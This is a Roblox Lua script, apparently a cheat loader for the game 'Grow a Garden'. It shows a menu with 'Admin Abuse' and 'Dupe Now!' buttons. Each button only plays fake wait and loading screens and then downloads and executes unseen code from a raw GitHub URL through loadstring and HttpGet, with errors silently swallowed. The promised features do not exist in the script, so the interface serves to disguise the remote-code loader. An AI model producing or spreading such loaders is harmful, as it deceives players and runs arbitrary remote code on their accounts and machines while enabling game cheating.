-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- MAIN GUI
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", mainGui)
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0.05

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local layout = Instance.new("UIListLayout", mainFrame)
layout.Padding = UDim.new(0, 10)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

-- "Please Wait..." GUI (hidden by default)
local waitGui = Instance.new("TextLabel")
waitGui.Parent = mainGui
waitGui.Size = UDim2.new(0, 200, 0, 50)
waitGui.Position = UDim2.new(0.5, -100, 0.5, -100)
waitGui.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
waitGui.Text = "Please wait..."
waitGui.Font = Enum.Font.Cartoon
waitGui.TextSize = 30
waitGui.TextColor3 = Color3.new(1, 1, 1)
waitGui.BackgroundTransparency = 0.2
waitGui.Visible = false
Instance.new("UICorner", waitGui).CornerRadius = UDim.new(0, 10)

-- Fullscreen loading screen (hidden by default)
local loadingScreen = Instance.new("ScreenGui", playerGui)
loadingScreen.Name = "LoadingScreen"
loadingScreen.Enabled = false
loadingScreen.ResetOnSpawn = false

local loadingFrame = Instance.new("Frame", loadingScreen)
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local loadingText = Instance.new("TextLabel", loadingFrame)
loadingText.Size = UDim2.new(1, 0, 1, 0)
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.Cartoon
loadingText.TextSize = 48
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.BackgroundTransparency = 1
loadingText.TextTransparency = 0

-- Button creation
local function createButton(name)
	local btn = Instance.new("TextButton", mainFrame)
	btn.Size = UDim2.new(0.8, 0, 0, 40)
	btn.Text = name
	btn.Font = Enum.Font.Cartoon
	btn.TextSize = 24
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
	btn.AutoButtonColor = true
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
	return btn
end

-- Animation + Loading Function
local function onButtonClick(btn)
	-- Animate button shrinking
	local shrinkTween = TweenService:Create(btn, TweenInfo.new(0.3), {
		Size = UDim2.new(0.8, 0, 0, 0),
		TextTransparency = 1
	})
	shrinkTween:Play()
	shrinkTween.Completed:Wait()

	-- Show "please wait..." label
	waitGui.Visible = true

	wait(2)

	-- Show loading screen
	mainGui.Enabled = false
	waitGui.Visible = false
	loadingScreen.Enabled = true

	wait(1)
	TweenService:Create(loadingText, TweenInfo.new(1), {TextTransparency = 0}):Play()
	wait(3)

	-- Fade out loading screen
	TweenService:Create(loadingFrame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
	TweenService:Create(loadingText, TweenInfo.new(1), {TextTransparency = 1}):Play()
	wait(1.1)
	loadingScreen:Destroy()

	-- Load external script
	pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
	end)
end

-- Create & bind buttons
local adminButton = createButton("Admin Abuse")
adminButton.MouseButton1Click:Connect(function() onButtonClick(adminButton) end)

local dupeButton = createButton("Dupe Now!")
dupeButton.MouseButton1Click:Connect(function() onButtonClick(dupeButton) end)
